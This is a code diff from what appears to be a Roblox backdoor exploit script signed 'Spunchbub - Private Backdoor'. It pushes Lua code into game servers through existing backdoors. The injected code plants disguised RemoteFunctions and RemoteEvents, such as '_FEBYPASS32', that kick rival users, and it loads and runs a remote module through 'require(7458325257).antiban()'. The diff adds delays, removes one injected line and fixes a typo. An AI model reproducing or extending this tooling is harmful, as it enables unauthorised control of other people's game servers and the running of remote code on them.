@@ -1185,6 +1185,7 @@ for _, svc in ipairs(services) do
  local r = Instance.new("RemoteFunction")
  r.Name = "rbxAssetid_core__temp_3023g78"
  r.OnServerInvoke = function(plr)
+  task.wait(3.3)
   plr:Kick("Backdoor has been secured by Spunchbub - Private Backdoor")
  end
  r.Parent = p
@@ -1212,12 +1213,12 @@ for _, svc in ipairs(services) do
     local r = Instance.new("RemoteFunction")
     r.Name = "spunch.bd_cssr6-O1"
     r.OnServerInvoke = function(player)
+        task.wait(3.3)
         player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
     end
     r.Parent = svc
   end
 end]])
-fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")end)')
 fireRemoteEvent('require(7458325257).antiban()')
 fireRemoteEvent([[
 local frm = game:GetService("FeatureRestrictionManager")
@@ -1237,7 +1238,7 @@ remoteFunction.OnServerInvoke = function(player, code)
 
         s.Ended:Once(function()
            s:Destroy()
-    m      player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
+           player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
         end)
 
         s:Play()
